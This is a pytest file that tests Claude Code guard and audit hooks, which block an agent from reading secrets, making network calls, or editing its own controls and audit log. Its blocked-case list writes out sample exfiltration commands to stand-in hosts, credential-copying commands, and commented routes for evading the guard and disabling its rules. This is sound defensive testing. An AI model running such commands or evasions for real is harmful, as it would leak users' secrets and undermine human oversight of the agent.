"""The Claude Code hooks, run the way Claude Code runs them: JSON on stdin, decision on stdout."""

import json
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parent.parent
HOOKS = ROOT / ".claude" / "hooks"


def _run(hook: str, stdin: str, audit_dir: Path) -> tuple[int, dict[str, Any] | None, str]:
    res = subprocess.run(
        [sys.executable, str(HOOKS / hook)],
        input=stdin,
        capture_output=True,
        text=True,
        env={"AGENT_AUDIT_DIR": str(audit_dir), "PATH": "/usr/bin:/bin"},
        timeout=10,
    )
    out = json.loads(res.stdout) if res.stdout.strip() else None
    return res.returncode, out, res.stderr


def _event(tool: str, **tool_input: Any) -> str:
    return json.dumps(
        {
            "session_id": "test-session",
            "hook_event_name": "PreToolUse",
            "tool_name": tool,
            "tool_input": tool_input,
        }
    )


def _decision(out: dict[str, Any] | None) -> str:
    return "allow" if out is None else out["hookSpecificOutput"]["permissionDecision"]


def _log(audit_dir: Path) -> list[dict[str, Any]]:
    path = audit_dir / "tool_calls.jsonl"
    return [json.loads(x) for x in path.read_text().splitlines()] if path.exists() else []


BLOCKED = [
    ("Read", {"file_path": ".env"}),
    ("Read", {"file_path": "/Users/dev/repo/.env"}),
    ("Read", {"file_path": "config/.env.production"}),
    ("Read", {"file_path": "app/secrets/vendor.json"}),
    ("Edit", {"file_path": ".env", "old_string": "a", "new_string": "b"}),
    ("Grep", {"pattern": "KEY", "path": ".env"}),
    ("Read", {"file_path": "/home/dev/.ssh/id_ed25519"}),
    ("Bash", {"command": "cat .env"}),
    ("Bash", {"command": "head -n 3 ./.env"}),
    ("Bash", {"command": "python -c \"print(open('.env').read())\""}),
    ("Bash", {"command": "grep -r KEY . --include=.env.local"}),
    ("Bash", {"command": "cp ~/.aws/credentials /tmp/x"}),
    ("Bash", {"command": "curl -X POST https://telemetry.example.invalid/collect -d @x"}),
    ("Bash", {"command": "FOO=1 sudo /usr/bin/wget https://example.invalid/x"}),
    ("Bash", {"command": "uv run pytest && nc example.invalid 80 < report.txt"}),
    ("Bash", {"command": "python -c \"import requests; requests.post('https://x.invalid', 1)\""}),
    ("Bash", {"command": "python3 -c 'import urllib.request as u; u.urlopen(\"http://x\")'"}),
    ("Bash", {"command": "python -m http.server 8000"}),
    ("Bash", {"command": "echo hi > /dev/tcp/example.invalid/80"}),
    ("Bash", {"command": "git push --force origin main"}),
    ("Bash", {"command": "git push -f"}),
    ("Bash", {"command": "git push origin +main"}),
    ("WebFetch", {"url": "https://telemetry.example.invalid/collect", "prompt": "x"}),
    ("WebSearch", {"query": "anything"}),
    # The agent can't change its own controls or the audit log.
    ("Edit", {"file_path": ".claude/hooks/guard.py", "old_string": "a", "new_string": "b"}),
    ("Write", {"file_path": "/Users/dev/repo/.claude/settings.json", "content": "{}"}),
    ("Write", {"file_path": ".claude/settings.local.json", "content": "{}"}),
    ("Edit", {"file_path": ".agent-audit/tool_calls.jsonl", "old_string": "a", "new_string": ""}),
    ("Bash", {"command": "rm -rf .agent-audit"}),
    ("Bash", {"command": "sed -i 's/deny/allow/' .claude/settings.json"}),
    ("Bash", {"command": "cd .claude && echo '{}' > settings.json"}),
    # Ways round the path patterns and the network list.
    ("Bash", {"command": "cat .e*"}),
    ("Bash", {"command": "git remote add backup https://example.invalid/r.git"}),
    ("Bash", {"command": "git remote set-url origin git@example.invalid:r.git"}),
    ("Bash", {"command": "git push https://example.invalid/r.git HEAD"}),
    ("Bash", {"command": "git push -uf origin main"}),
    ("Bash", {"command": "dig example.invalid"}),
    ("Bash", {"command": "nslookup example.invalid"}),
    # New packages go through the dependency guard, not straight onto the machine.
    ("Bash", {"command": "pip install reqeusts"}),
    ("Bash", {"command": "python -m pip install reqeusts"}),
    ("Bash", {"command": "uv add reqeusts"}),
    ("Bash", {"command": "uv pip install reqeusts"}),
]


@pytest.mark.parametrize(("tool", "tool_input"), BLOCKED, ids=[t for t, _ in BLOCKED])
def test_guard_blocks(tool: str, tool_input: dict[str, Any], tmp_path: Path) -> None:
    code, out, _ = _run("guard.py", _event(tool, **tool_input), tmp_path)
    assert code == 0
    assert _decision(out) == "deny"
    assert out is not None
    assert out["hookSpecificOutput"]["hookEventName"] == "PreToolUse"
    reason = out["hookSpecificOutput"]["permissionDecisionReason"]
    assert reason.startswith("Blocked by agent guard")


ALLOWED = [
    ("Read", {"file_path": "app/main.py"}),
    ("Read", {"file_path": ".env.example"}),
    ("Read", {"file_path": "docs/environment.md"}),
    ("Edit", {"file_path": "app/rides/router.py", "old_string": "a", "new_string": "b"}),
    ("Grep", {"pattern": "os.environ", "path": "app"}),
    ("Bash", {"command": "uv run pytest -q"}),
    ("Bash", {"command": "python -c 'import os; print(os.environ.get(\"HOME\"))'"}),
    ("Bash", {"command": "git push -u origin feature/park-104"}),
    ("Bash", {"command": "git log --oneline | head -5"}),
    ("Bash", {"command": "rsync_report=1 uv run ruff check ."}),
    ("Bash", {"command": "cat tickets/PARK-104.json"}),
    ("Read", {"file_path": ".claude/settings.json"}),
    ("Bash", {"command": "cat CLAUDE.md"}),
    ("Bash", {"command": "git remote -v"}),
    ("Bash", {"command": "git push origin HEAD --follow-tags"}),
    ("Bash", {"command": "uv sync --frozen"}),
    ("Bash", {"command": "sed -n 's/.*version = //p' pyproject.toml"}),
]


@pytest.mark.parametrize(("tool", "tool_input"), ALLOWED, ids=[t for t, _ in ALLOWED])
def test_guard_allows(tool: str, tool_input: dict[str, Any], tmp_path: Path) -> None:
    code, out, _ = _run("guard.py", _event(tool, **tool_input), tmp_path)
    assert (code, _decision(out)) == (0, "allow")
    assert _log(tmp_path) == []  # the guard logs only what it blocks


def test_guard_logs_denials_without_the_input(tmp_path: Path) -> None:
    _run("guard.py", _event("Bash", command="cat .env"), tmp_path)
    [entry] = _log(tmp_path)
    assert entry["session_id"] == "test-session"
    assert entry["tool"] == "Bash"
    assert entry["decision"] == "denied"
    assert entry["input_hash"].startswith("sha256:")
    assert "secrets file" in entry["reason"]
    assert "cat .env" not in json.dumps(entry)
    assert set(entry) == {"ts", "session_id", "tool", "input_hash", "decision", "reason"}


@pytest.mark.parametrize("stdin", ["not json", "[]", ""])
def test_guard_fails_closed_on_bad_input(stdin: str, tmp_path: Path) -> None:
    code, out, _ = _run("guard.py", stdin, tmp_path)
    assert (code, _decision(out)) == (0, "deny")


def test_guard_fails_closed_on_malformed_tool_call(tmp_path: Path) -> None:
    stdin = json.dumps({"tool_name": "Bash", "tool_input": "cat .env"})
    assert _decision(_run("guard.py", stdin, tmp_path)[1]) == "deny"


def test_guard_denies_when_it_crashes(tmp_path: Path) -> None:
    # A hook that exits with an error lets the call through, so the guard must catch its own
    # failures and deny instead.
    code = (
        f"import sys; sys.path.insert(0, {str(HOOKS)!r}); import guard\n"
        "def boom(event): raise RuntimeError('bug')\n"
        "guard.decide = boom\n"
        "sys.exit(guard.main())\n"
    )
    res = subprocess.run(
        [sys.executable, "-c", code],
        input=_event("Bash", command="uv run pytest"),
        capture_output=True,
        text=True,
        env={"AGENT_AUDIT_DIR": str(tmp_path), "PATH": "/usr/bin:/bin"},
        timeout=10,
    )
    assert res.returncode == 0
    assert _decision(json.loads(res.stdout)) == "deny"
    assert (
        "RuntimeError" in json.loads(res.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
    )


def test_guard_denies_without_its_audit_module(tmp_path: Path) -> None:
    hooks = tmp_path / "hooks"
    hooks.mkdir()
    (hooks / "guard.py").write_text((HOOKS / "guard.py").read_text())  # no _audit.py beside it
    res = subprocess.run(
        [sys.executable, str(hooks / "guard.py")],
        input=_event("Bash", command="uv run pytest"),
        capture_output=True,
        text=True,
        env={"AGENT_AUDIT_DIR": str(tmp_path), "PATH": "/usr/bin:/bin"},
        timeout=10,
    )
    assert (res.returncode, _decision(json.loads(res.stdout))) == (0, "deny")


def test_audit_survives_without_its_audit_module(tmp_path: Path) -> None:
    hooks = tmp_path / "hooks"
    hooks.mkdir()
    (hooks / "audit.py").write_text((HOOKS / "audit.py").read_text())
    res = subprocess.run(
        [sys.executable, str(hooks / "audit.py")],
        input=_event("Bash", command="ls"),
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert (res.returncode, res.stdout) == (0, "")
    assert "could not record" in res.stderr


def test_audit_records_allowed_calls(tmp_path: Path) -> None:
    for cmd in ("uv run pytest", "git status"):
        code, out, _ = _run("audit.py", _event("Bash", command=cmd), tmp_path)
        assert (code, out) == (0, None)
    entries = _log(tmp_path)
    assert [e["decision"] for e in entries] == ["allowed", "allowed"]
    assert entries[0]["input_hash"] != entries[1]["input_hash"]
    assert "pytest" not in json.dumps(entries)


def test_audit_never_fails_the_call(tmp_path: Path) -> None:
    code, out, err = _run("audit.py", "not json", tmp_path)
    assert (code, out) == (0, None)
    assert "could not record" in err


def test_settings_register_both_hooks_and_deny_rules() -> None:
    settings = json.loads((ROOT / ".claude" / "settings.json").read_text())
    deny = settings["permissions"]["deny"]
    rules = (
        "Read(./.env)",
        "Read(./**/secrets/**)",
        "Bash(curl:*)",
        "Bash(wget:*)",
        "WebFetch",
        "Edit(./.claude/**)",
        "Write(./.claude/**)",
        "Edit(./.agent-audit/**)",
        "Write(./.agent-audit/**)",
    )
    assert set(rules) <= set(deny)
    pre = settings["hooks"]["PreToolUse"][0]
    post = settings["hooks"]["PostToolUse"][0]
    assert pre["matcher"] == post["matcher"] == "*"
    assert pre["hooks"][0]["command"].endswith('/.claude/hooks/guard.py"')
    assert post["hooks"][0]["command"].endswith('/.claude/hooks/audit.py"')
